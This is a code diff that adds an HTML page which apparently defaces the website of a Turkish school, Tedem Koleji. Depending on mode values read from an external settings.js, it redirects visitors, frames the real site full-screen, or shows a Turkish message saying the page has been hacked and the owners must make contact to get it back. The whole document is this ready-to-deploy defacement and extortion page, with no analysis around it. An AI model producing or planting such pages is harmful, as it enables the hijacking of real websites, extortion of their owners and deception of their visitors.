@@ -1,0 +1,47 @@
+<script src="settings.js"></script>
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tedem Koleji</title>
+  <style>
+    html,body{margin:0;padding:0;background:#fff;color:#111;font:16px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif}
+    .wrap{min-height:100dvh;display:none;place-items:center}
+    .card{max-width:640px;width:92%;text-align:center;border:1px solid #e5e7eb;border-radius:16px;padding:2rem}
+    h1{margin:0 0 .5rem;font-size:clamp(22px,4vw,34px);letter-spacing:.2px}
+    p{margin:.25rem 0}
+    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.95em}
+    #frame-overlay{display:none;position:fixed;inset:0;width:100vw;height:100dvh;z-index:9999;background:#fff}
+    #frame-overlay iframe{display:block;width:100%;height:100%;border:0}
+  </style>
+</head>
+<body>
+  <main class="wrap" id="hack-wrap" aria-label="bilgilendirme">
+    <section class="card">
+      <h1>Bu sayfa <span class="mono">hacklenmiştir</span></h1>
+      <p class="mono">Geri almak istiyorsanız bizle iletişime geçmeniz gerekmektedir.</p>
+    </section>
+  </main>
+  <div id="frame-overlay" aria-label="site-önizleme"></div>
+  <script>
+    (function(){
+      var w=document.getElementById("hack-wrap");
+      var o=document.getElementById("frame-overlay");
+      if(MODE===0){window.location.replace(TARGET);return;}
+      if(MODE===1){w.style.display="grid";o.style.display="none";return;}
+      if(MODE===2){
+        document.documentElement.style.height="100%";
+        document.body.style.height="100%";
+        document.body.style.overflow="hidden";
+        o.innerHTML='<iframe src="'+TARGET+'" title="tedemkoleji.com.tr" referrerpolicy="no-referrer" allow="fullscreen"></iframe>';
+        o.style.display="block";
+        w.style.display="none";
+        return;
+      }
+      w.style.display="none";
+      o.style.display="none";
+    })();
+  </script>
+</body>
+</html>
